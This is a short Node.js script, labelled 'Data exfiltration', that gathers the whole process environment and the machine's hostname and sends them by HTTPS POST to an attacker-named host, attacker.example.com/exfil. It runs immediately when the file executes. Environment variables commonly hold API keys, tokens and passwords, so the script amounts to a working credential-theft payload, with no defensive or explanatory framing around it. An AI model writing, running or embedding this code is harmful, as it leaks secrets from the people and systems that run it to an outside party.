// Data exfiltration
const https = require('https');
const os = require('os');

function exfil(data) {
    const options = {
        hostname: 'attacker.example.com',
        port: 443,
        path: '/exfil',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    };
    const req = https.request(options);
    req.write(JSON.stringify({data: data, host: os.hostname()}));
    req.end();
}

exfil(process.env);
